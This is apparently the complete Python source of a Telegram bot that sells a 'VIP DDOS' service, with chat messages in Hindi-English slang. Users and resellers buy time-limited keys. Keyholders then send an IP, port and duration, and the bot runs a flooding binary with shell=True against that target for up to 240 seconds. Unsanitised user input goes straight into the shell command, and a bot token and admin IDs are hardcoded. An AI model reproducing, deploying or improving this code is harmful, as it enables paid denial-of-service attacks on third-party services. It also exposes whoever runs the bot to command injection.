import os,json,time,telebot,datetime,subprocess,threading
from dateutil.relativedelta import relativedelta
from telebot.types import InlineKeyboardMarkup,InlineKeyboardButton

# Bot token
bot=telebot.TeleBot('7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis')

# Admin IDs
admin_id={"1807014348","6258297180"}

# File paths
USER_FILE="users.json"
LOG_FILE="log.txt"
KEY_FILE="keys.json"
RESELLERS_FILE="resellers.json"

# Reseller cost
KEY_COST_PER_DAY=30

# In-memory storage
users={}
keys={}
last_attack_time={}
COOLDOWN_PERIOD=60
rate_limit={}

def escape_markdown(text):
 chars=['_','*','[',']','(',')','~','`','>','#','+','-','=','|','{','}','.','!']
 for char in chars:
  text=text.replace(char,f'\\{char}')
 return text

def set_cooldown(seconds):
 global COOLDOWN_PERIOD
 COOLDOWN_PERIOD=seconds
 with open("cooldown.json","w") as f:
  json.dump({"cooldown":seconds},f)

def load_cooldown():
 global COOLDOWN_PERIOD
 try:
  with open("cooldown.json","r") as f:
   COOLDOWN_PERIOD=json.load(f).get("cooldown",60)
 except (FileNotFoundError,json.JSONDecodeError):
  COOLDOWN_PERIOD=60

def load_data():
 global users,keys
 users=read_users()
 keys=read_keys()
 load_cooldown()

def read_users():
 try:
  with open(USER_FILE,"r") as f:
   return json.load(f)
 except (FileNotFoundError,json.JSONDecodeError):
  return {}

def save_users():
 with open(USER_FILE,"w") as f:
  json.dump(users,f)

def read_keys():
 try:
  with open(KEY_FILE,"r") as f:
   return json.load(f)
 except (FileNotFoundError,json.JSONDecodeError):
  return {}

def save_keys():
 with open(KEY_FILE,"w") as f:
  json.dump(keys,f)

def create_random_key(key_name):
 return f"rahul-sadiq{key_name}"

def parse_duration(duration_str):
 try:
  unit=duration_str[-1].lower()
  value=int(duration_str[:-1])
  if unit=='h':return relativedelta(hours=value)
  if unit=='d':return relativedelta(days=value)
  if unit=='m':return relativedelta(months=value)
 except ValueError:
  return None

def add_time_to_current_date(delta):
 return datetime.datetime.now()+delta

def load_resellers():
 try:
  with open(RESELLERS_FILE,"r") as f:
   return json.load(f)
 except (FileNotFoundError,json.JSONDecodeError):
  return {}

def save_resellers(resellers):
 with open(RESELLERS_FILE,"w") as f:
  json.dump(resellers,f,indent=4)

resellers=load_resellers()

def log_command(user_id,target,port,time):
 user_info=bot.get_chat(user_id)
 username=user_info.username or f"UserID: {user_id}"
 with open("log.txt","a") as f:
  f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id,command,target=None,port=None,time=None):
 log=f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
 if target:log+=f" | Target: {target}"
 if port:log+=f" | Port: {port}"
 if time:log+=f" | Time: {time}"
 with open("log.txt","a") as f:
  f.write(log+"\n")

def execute_attack(target,port,time,chat_id,username,last_attack_time,user_id):
 try:
  packet_size=1200
  if packet_size<1 or packet_size>65507:
   bot.send_message(chat_id,"🚫 *Error*: Packet size must be 1\\-65507\\!",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  full_command=f"./Rohan {target} {port} {time} {packet_size}"
  response=(
   "💥 *Attack Shuru Ho Gaya!* 🚀\n"
   "══════════════════════\n"
   f"🎯 *Target*: `{escape_markdown(f'{target}:{port}')}`\n"
   f"⏱ *Time*: {time} sec\n"
   f"📦 *Packet Size*: {packet_size} bytes\n"
   f"🧵 *Threads*: 512\n"
   f"👑 *Emperor*: @{escape_markdown(username)}\n"
   "══════════════════════\n"
   "🔥 *Status*: Attack chal raha hai!"
  )
  bot.send_message(chat_id,response,parse_mode='MarkdownV2',reply_markup=back_menu())
  subprocess.Popen(full_command,shell=True)
  threading.Timer(time,send_attack_finished_message,[chat_id]).start()
  last_attack_time[user_id]=datetime.datetime.now()
 except Exception as e:
  bot.send_message(chat_id,f"🚫 *Error*: Attack nahi chala! \\- {escape_markdown(str(e))}",parse_mode='MarkdownV2',reply_markup=back_menu())

def send_attack_finished_message(chat_id):
 bot.send_message(chat_id,"🏁 *Attack Khatam!* ✅\n══════════════════════\n🔥 *Result*: Mission complete!",parse_mode='MarkdownV2',reply_markup=back_menu())

def main_menu():
 markup=InlineKeyboardMarkup()
 markup.row_width=2
 markup.add(
  InlineKeyboardButton("💥 Attack",callback_data="attack"),
  InlineKeyboardButton("🔑 Redeem",callback_data="redeem"),
  InlineKeyboardButton("👤 My Info",callback_data="myinfo"),
  InlineKeyboardButton("📜 Rules",callback_data="rules")
 )
 return markup

def back_menu():
 markup=InlineKeyboardMarkup()
 markup.add(InlineKeyboardButton("🏠 Back to Menu",callback_data="menu"))
 return markup

def check_rate_limit(user_id):
 now=time.time()
 if user_id in rate_limit and now-rate_limit[user_id]<60:
  bot.send_message(user_id,"🚫 *BSDK, spam mat kar! Ek minute ruk, Emperor!* 👑",parse_mode='MarkdownV2',reply_markup=back_menu())
  return False
 rate_limit[user_id]=now
 return True

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
 user_id=str(call.from_user.id)
 if not check_rate_limit(user_id):
  return
 if call.data=="menu":
  bot.edit_message_text(
   chat_id=call.message.chat.id,
   message_id=call.message.message_id,
   text="🌟 *Wapas Menu Mein!* 👑\n══════════════════════\n🔥 *Kya Karna Hai?*",
   parse_mode='MarkdownV2',
   reply_markup=main_menu()
  )
 elif call.data=="attack":
  bot.answer_callback_query(call.id)
  bot.send_message(call.message.chat.id,"💥 *Attack Mode*\nBhai, format yeh hai: `/attack <ip> <port> <time>`",parse_mode='MarkdownV2',reply_markup=back_menu())
 elif call.data=="redeem":
  bot.answer_callback_query(call.id)
  bot.send_message(call.message.chat.id,"🔑 *Key Redeem Kar*\nApna key bhej:",parse_mode='MarkdownV2',reply_markup=back_menu())
  bot.register_next_step_handler(call.message,process_redeem_key)
 elif call.data=="myinfo":
  bot.answer_callback_query(call.id)
  my_info(call.message)
 elif call.data=="rules":
  bot.answer_callback_query(call.id)
  bot.send_message(call.message.chat.id,(
   "📜 *Rules Bolta Hai* 📋\n"
   "══════════════════════\n"
   "1️⃣ Attack max 240 sec tak\n"
   "2️⃣ Cooldown ka dhyan rakh\n"
   "3️⃣ Key share mat kar\n"
   "4️⃣ Admin ko respect de\n"
   "══════════════════════\n"
   "🔥 *Emperor ka rule, follow kar!*"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())
 bot.answer_callback_query(call.id)

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
 user_id=str(message.chat.id)
 if user_id not in admin_id:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admins ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 command=message.text.split()
 if len(command)!=3:
  bot.reply_to(message,"❌ *Galat Command*\nFormat: `/add_reseller <user_id> <balance>`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 reseller_id=command[1]
 try:
  initial_balance=int(command[2])
 except ValueError:
  bot.reply_to(message,"❌ *Error*: Balance number mein daal!",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 if reseller_id not in resellers:
  resellers[reseller_id]=initial_balance
  save_resellers(resellers)
  bot.reply_to(message,(
   "✅ *Naya Reseller Joda!* 🎉\n"
   "══════════════════════\n"
   f"🆔 *Reseller ID*: `{escape_markdown(reseller_id)}`\n"
   f"💰 *Balance*: {initial_balance} Rs\n"
   "══════════════════════"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,f"⚠️ *Error*: Reseller `{escape_markdown(reseller_id)}` pehle se hai!",parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['genkey'])
def generate_key_admin(message):
 user_id=str(message.chat.id)
 if user_id not in admin_id:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 command=message.text.split()
 if len(command)<3 or len(command)>4:
  bot.reply_to(message,"❌ *Galat Command*\nFormat: `/genkey <duration> <key_name> [device_limit]`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 duration_str=command[1]
 key_name=command[2]
 device_limit=int(command[3]) if len(command)==4 else 1
 duration_delta=parse_duration(duration_str)
 if not duration_delta:
  bot.reply_to(message,"❌ *Error*: Duration format galat! Use `50d`, `30h`, `2m`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 if device_limit<1:
  bot.reply_to(message,"❌ *Error*: Device limit kam se kam 1 hona chahiye!",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 key=create_random_key(key_name)
 keys[key]={
  "name":key_name,
  "duration":duration_str,
  "device_limit":device_limit,
  "devices_used":[],
  "expiration_time":None
 }
 save_keys()
 response=(
  "✅ *Key Ban Gaya!* 🔑\n"
  "══════════════════════\n"
  f"🔑 *Key*: `{escape_markdown(key)}`\n"
  f"🏷 *Name*: {escape_markdown(key_name)}\n"
  f"⏳ *Duration*: {escape_markdown(duration_str)}\n"
  f"📱 *Device Limit*: {device_limit}\n"
  "══════════════════════"
 )
 bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['gen'])
def generate_key_reseller(message):
 user_id=str(message.chat.id)
 if user_id not in resellers:
  bot.reply_to(message,"🚫 *No Entry*: Sirf reseller ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 command=message.text.split()
 if len(command)!=3:
  bot.reply_to(message,"❌ *Galat Command*\nFormat: `/gen <duration> <key_name>`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 duration_str=command[1]
 key_name=command[2]
 duration_delta=parse_duration(duration_str)
 if not duration_delta:
  bot.reply_to(message,"❌ *Error*: Duration format galat! Use `50d`, `30h`, `2m`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 days=duration_delta.days or (duration_delta.hours/24) or (duration_delta.months*30)
 cost=days*KEY_COST_PER_DAY
 if resellers[user_id]<cost:
  bot.reply_to(message,(
   "⚠️ *Paise Kam Hai!* 💸\n"
   "══════════════════════\n"
   f"💰 *Chahiye*: {cost} Rs\n"
   f"📈 *Available*: {resellers[user_id]} Rs\n"
   "══════════════════════"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 resellers[user_id]-=cost
 save_resellers(resellers)
 key=create_random_key(key_name)
 keys[key]={
  "name":key_name,
  "duration":duration_str,
  "device_limit":1,
  "devices_used":[],
  "expiration_time":None
 }
 save_keys()
 response=(
  "✅ *Key Ban Gaya!* 🔑\n"
  "══════════════════════\n"
  f"🔑 *Key*: `{escape_markdown(key)}`\n"
  f"🏷 *Name*: {escape_markdown(key_name)}\n"
  f"⏳ *Duration*: {escape_markdown(duration_str)}\n"
  f"📱 *Device Limit*: 1\n"
  f"💸 *Cost*: {cost} Rs\n"
  f"📈 *Balance Bacha*: {resellers[user_id]} Rs\n"
  "══════════════════════"
 )
 bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['help'])
def help_command(message):
 user_id=str(message.chat.id)
 if user_id not in admin_id:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 help_text=(
  "🌟 *Emperor ka Control Panel* 🌟\n"
  "══════════════════════\n"
  "📋 *Bot Commands*:\n"
  "➡️ `/start` \\- Shuru kar bot\n"
  "➡️ `/help` \\- Yeh guide dekh\n\n"
  "⚙️ *Power Tools*:\n"
  "➡️ `/attack <ip> <port> <time>` \\- Attack shuru\n"
  "➡️ `/setcooldown <seconds>` \\- Cooldown set kar\n"
  "➡️ `/checkcooldown` \\- Cooldown check kar\n"
  "➡️ `/add_reseller <user_id> <balance>` \\- Naya reseller add\n"
  "➡️ `/genkey <duration> <key_name> [device_limit]` \\- Key bana \\(admin\\)\n"
  "➡️ `/gen <duration> <key_name>` \\- Key bana \\(reseller\\)\n"
  "➡️ `/logs` \\- Logs dekh\n"
  "➡️ `/users` \\- Users ki list\n"
  "➡️ `/remove <user_id>` \\- User hata\n"
  "➡️ `/resellers` \\- Resellers dekh\n"
  "➡️ `/addbalance <reseller_id> <amount>` \\- Reseller ko paise de\n"
  "➡️ `/remove_reseller <reseller_id>` \\- Reseller hata\n\n"
  "📝 *Examples*:\n"
  "➡️ `/genkey 30h Rahul 2` \\- 30 ghante ka key, 2 device\n"
  "➡️ `/gen 50d Rahul` \\- 50 din ka key, 1 device\n"
  "➡️ `/attack 192.168.1.1 80 120` \\- Attack kar\n"
  "➡️ `/setcooldown 120` \\- 120 sec cooldown\n"
  "➡️ `/checkcooldown` \\- Cooldown dekh\n\n"
  "📞 *Emperor se baat kar!* 👑\n"
  "══════════════════════"
 )
 bot.reply_to(message,help_text,parse_mode='MarkdownV2',reply_markup=main_menu())

@bot.message_handler(commands=['balance'])
def check_balance(message):
 user_id=str(message.chat.id)
 if user_id in resellers:
  response=(
   "💰 *Tera Balance* 💸\n"
   "══════════════════════\n"
   f"📈 *Abhi Hai*: {resellers[user_id]} Rs\n"
   "══════════════════════"
  )
 else:
  response="🚫 *No Entry*: Sirf reseller ke liye! 🔒"
 bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
 bot.reply_to(message,"🔑 *Key Daal, Bhai!*\nApna key bhej jaldi:",parse_mode='MarkdownV2',reply_markup=back_menu())
 bot.register_next_step_handler(message,process_redeem_key)

def process_redeem_key(message):
 user_id=str(message.chat.id)
 key=message.text.strip()
 if key in keys:
  if user_id in users:
   current_expiration=datetime.datetime.strptime(users[user_id]["expiration"],'%Y-%m-%d %H:%M:%S')
   if datetime.datetime.now()<current_expiration:
    bot.reply_to(message,"⚠️ *Error*: Tera access pehle se active hai!",parse_mode='MarkdownV2',reply_markup=back_menu())
    return
  if len(keys[key]["devices_used"])>=keys[key]["device_limit"]:
   bot.reply_to(message,"🚫 *Error*: Is key ka device limit khatam!",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  if user_id in keys[key]["devices_used"]:
   bot.reply_to(message,"🚫 *Error*: Tu is key ko pehle use kar chuka hai!",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  duration_delta=parse_duration(keys[key]["duration"])
  if not duration_delta:
   bot.reply_to(message,"🚫 *Error*: Key ka duration galat hai!",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  expiration_time=add_time_to_current_date(duration_delta)
  users[user_id]={
   "expiration":expiration_time.strftime('%Y-%m-%d %H:%M:%S'),
   "key":key
  }
  keys[key]["devices_used"].append(user_id)
  save_users()
  save_keys()
  bot.reply_to(message,(
   "✅ *Access Mil Gaya!* 🎉\n"
   "══════════════════════\n"
   f"🏷 *Key Name*: {escape_markdown(keys[key]['name'])}\n"
   f"📅 *Expiry*: {escape_markdown(users[user_id]['expiration'])}\n"
   f"📱 *Device Limit*: {keys[key]['device_limit']}\n"
   "══════════════════════"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,"❌ *Error*: Key galat ya expire ho gaya!",parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
 user_id=str(message.chat.id)
 if user_id in admin_id:
  if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size>0:
   try:
    with open(LOG_FILE,"rb") as f:
     bot.send_document(message.chat.id,f,caption="📜 *Taza Logs* 📋",parse_mode='MarkdownV2')
   except FileNotFoundError:
    bot.reply_to(message,"⚠️ *Error*: Koi log nahi mila!",parse_mode='MarkdownV2',reply_markup=back_menu())
  else:
   bot.reply_to(message,"⚠️ *Error*: Koi log nahi mila!",parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['start'])
def start_command(message):
 bot.reply_to(message,(
  "🌟 *Welcome to VIP DDOS, Emperor!* 🌟\n"
  "══════════════════════\n"
  "🔥 *Kya Karna Hai?*\n"
  "➡️ `/attack` \\- Dushman pe waar\n"
  "➡️ `/redeem` \\- Key activate kar\n"
  "➡️ `/myinfo` \\- Apni detail dekh\n"
  "➡️ `/setcooldown` \\- Cooldown set \\(admin\\)\n"
  "➡️ `/checkcooldown` \\- Cooldown check\n"
  "══════════════════════\n"
  "👑 *Chal, shuru ho ja!*"
 ),parse_mode='MarkdownV2',reply_markup=main_menu())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
 user_id=str(message.chat.id)
 if user_id in admin_id or user_id in users:
  expiration_date=None
  if user_id in users:
   expiration_date=datetime.datetime.strptime(users[user_id]["expiration"],'%Y-%m-%d %H:%M:%S')
   if datetime.datetime.now()>expiration_date:
    bot.reply_to(message,"⚠️ *Error*: Tera access khatam! Admin se renew kar!",parse_mode='MarkdownV2',reply_markup=back_menu())
    return
  if user_id in last_attack_time:
   time_since_last_attack=(datetime.datetime.now()-last_attack_time[user_id]).total_seconds()
   if time_since_last_attack<COOLDOWN_PERIOD:
    remaining_cooldown=COOLDOWN_PERIOD-time_since_last_attack
    bot.reply_to(message,(
     "⏳ *Thoda Sabar, Bhai!*\n"
     "══════════════════════\n"
     f"⏱ *Wait Kar*: {int(remaining_cooldown)} sec\n"
     "══════════════════════"
    ),parse_mode='MarkdownV2',reply_markup=back_menu())
    return
  command=message.text.split()
  if len(command)!=4:
   bot.reply_to(message,"❌ *Galat Command*\nFormat: `/attack <ip> <port> <time>`",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  target=command[1]
  try:
   port=int(command[2])
   time=int(command[3])
   if time>240:
    bot.reply_to(message,"❌ *Error*: Time 240 sec se kam rakh!",parse_mode='MarkdownV2',reply_markup=back_menu())
    return
   record_command_logs(user_id,'attack',target,port,time)
   log_command(user_id,target,port,time)
   username=message.chat.username or "No username"
   execute_attack(target,port,time,message.chat.id,username,last_attack_time,user_id)
  except ValueError:
   bot.reply_to(message,"❌ *Error*: Port ya time galat hai!",parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,(
   "🚫 *Ruk Ja, Bhai!* 🔒\n"
   "══════════════════════\n"
   "📞 *Baat Kar*: @Pk_Chopra\n"
   "══════════════════════"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
 user_id=str(message.chat.id)
 if user_id not in admin_id:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 command=message.text.split()
 if len(command)!=2:
  bot.reply_to(message,"❌ *Galat Command*\nFormat: `/setcooldown <seconds>`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 try:
  seconds=int(command[1])
  if seconds<0:
   bot.reply_to(message,"❌ *Error*: Cooldown negative nahi ho sakta!",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  set_cooldown(seconds)
  bot.reply_to(message,(
   "✅ *Cooldown Set!* ⏳\n"
   "══════════════════════\n"
   f"⏱ *Naya Cooldown*: {seconds} sec\n"
   "══════════════════════"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())
 except ValueError:
  bot.reply_to(message,"❌ *Error*: Number daal, bhai!",parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
 bot.reply_to(message,(
  "⏳ *Cooldown Status* ⏱\n"
  "══════════════════════\n"
  f"⏱ *Abhi Hai*: {COOLDOWN_PERIOD} sec\n"
  "══════════════════════"
 ),parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['myinfo'])
def my_info(message):
 user_id=str(message.chat.id)
 username=message.chat.username or "No username"
 if user_id in admin_id:
  role="Admin"
  key_expiration="No access"
  balance="Not Applicable"
 elif user_id in resellers:
  role="Reseller"
  balance=resellers.get(user_id,0)
  key_expiration="No access"
 elif user_id in users:
  role="User"
  key_expiration=users[user_id]["expiration"]
  key_name=keys[users[user_id]["key"]]["name"] if users[user_id]["key"] in keys else "Unknown"
  balance="Not Applicable"
 else:
  role="Guest"
  key_expiration="No active key"
  balance="Not Applicable"
 response=(
  "👤 *Teri Info, Emperor!* 📋\n"
  "══════════════════════\n"
  f"📛 *Username*: @{escape_markdown(username)}\n"
  f"🆔 *User ID*: `{escape_markdown(user_id)}`\n"
  f"🎭 *Role*: {escape_markdown(role)}\n"
  f"📅 *Expiry*: {escape_markdown(key_expiration)}\n"
 )
 if role=="Reseller":
  response+=f"💰 *Balance*: {balance} Rs\n"
 elif role=="User":
  response+=f"🔑 *Key Name*: {escape_markdown(key_name)}\n"
 response+="══════════════════════"
 bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=main_menu())

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
 user_id=str(message.chat.id)
 if user_id not in admin_id:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 if users:
  response=(
   "👥 *Authorized Users* 📋\n"
   "══════════════════════\n"
  )
  for user,data in users.items():
   expiration_date=datetime.datetime.strptime(data["expiration"],'%Y-%m-%d %H:%M:%S')
   formatted_expiration=expiration_date.strftime('%Y-%m-%d %H:%M:%S')
   user_info=bot.get_chat(user)
   username=user_info.username or user_info.first_name
   key_name=keys[data["key"]]["name"] if data["key"] in keys else "Unknown"
   response+=(
    f"🆔 *User ID*: `{escape_markdown(user)}`\n"
    f"📛 *Username*: @{escape_markdown(username)}\n"
    f"🔑 *Key Name*: {escape_markdown(key_name)}\n"
    f"📅 *Expiry*: {escape_markdown(formatted_expiration)}\n"
    "──────────────────\n"
   )
 else:
  response="⚠️ *Koi User Nahi Mila!*"
 bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['remove'])
def remove_user(message):
 user_id=str(message.chat.id)
 if user_id not in admin_id:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 command=message.text.split()
 if len(command)!=2:
  bot.reply_to(message,"❌ *Galat Command*\nFormat: `/remove <User_ID>`",parse_mode='MarkdownV2',reply_markup=back_menu())
  return
 target_user_id=command[1]
 if target_user_id in users:
  del users[target_user_id]
  save_users()
  response=(
   "✅ *User Hata Diya!* 🗑\n"
   "══════════════════════\n"
   f"🆔 *User ID*: `{escape_markdown(target_user_id)}`\n"
   "══════════════════════"
  )
 else:
  response=f"⚠️ *Error*: User `{escape_markdown(target_user_id)}` nahi mila!"
 bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
 user_id=str(message.chat.id)
 if user_id in admin_id:
  response=(
   "🤝 *Resellers ki List* 📋\n"
   "══════════════════════\n"
  )
  if resellers:
   for reseller_id,balance in resellers.items():
    reseller_username=bot.get_chat(reseller_id).username or "Unknown"
    response+=(
     f"📛 *Username*: {escape_markdown(reseller_username)}\n"
     f"🆔 *User ID*: `{escape_markdown(reseller_id)}`\n"
     f"💰 *Balance*: {balance} Rs\n"
     "──────────────────\n"
    )
  else:
   response+="⚠️ *Koi Reseller Nahi Mila!*"
  bot.reply_to(message,response,parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
 user_id=str(message.chat.id)
 if user_id in admin_id:
  command=message.text.split()
  if len(command)!=3:
   bot.reply_to(message,"❌ *Galat Command*\nFormat: `/addbalance <reseller_id> <amount>`",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  reseller_id=command[1]
  try:
   amount=float(command[2])
   if reseller_id not in resellers:
    bot.reply_to(message,"⚠️ *Error*: Reseller ID nahi mila!",parse_mode='MarkdownV2',reply_markup=back_menu())
    return
   resellers[reseller_id]+=amount
   save_resellers(resellers)
   bot.reply_to(message,(
    "✅ *Balance Add Kiya!* 💸\n"
    "══════════════════════\n"
    f"🆔 *Reseller ID*: `{escape_markdown(reseller_id)}`\n"
    f"💰 *Added*: {amount} Rs\n"
    f"📈 *Naya Balance*: {resellers[reseller_id]} Rs\n"
    "══════════════════════"
   ),parse_mode='MarkdownV2',reply_markup=back_menu())
  except ValueError:
   bot.reply_to(message,"❌ *Error*: Amount galat hai!",parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
 user_id=str(message.chat.id)
 if user_id in admin_id:
  command=message.text.split()
  if len(command)!=2:
   bot.reply_to(message,"❌ *Galat Command*\nFormat: `/remove_reseller <reseller_id>`",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  reseller_id=command[1]
  if reseller_id not in resellers:
   bot.reply_to(message,"⚠️ *Error*: Reseller ID nahi mila!",parse_mode='MarkdownV2',reply_markup=back_menu())
   return
  del resellers[reseller_id]
  save_resellers(resellers)
  bot.reply_to(message,(
   "✅ *Reseller Hata Diya!* 🗑\n"
   "══════════════════════\n"
   f"🆔 *Reseller ID*: `{escape_markdown(reseller_id)}`\n"
   "══════════════════════"
  ),parse_mode='MarkdownV2',reply_markup=back_menu())
 else:
  bot.reply_to(message,"🚫 *No Entry*: Sirf admin ke liye! 🔒",parse_mode='MarkdownV2',reply_markup=back_menu())

if __name__=="__main__":
 load_data()
 while True:
  try:
   bot.polling(none_stop=True)
  except Exception as e:
   print(e)
   time.sleep(1)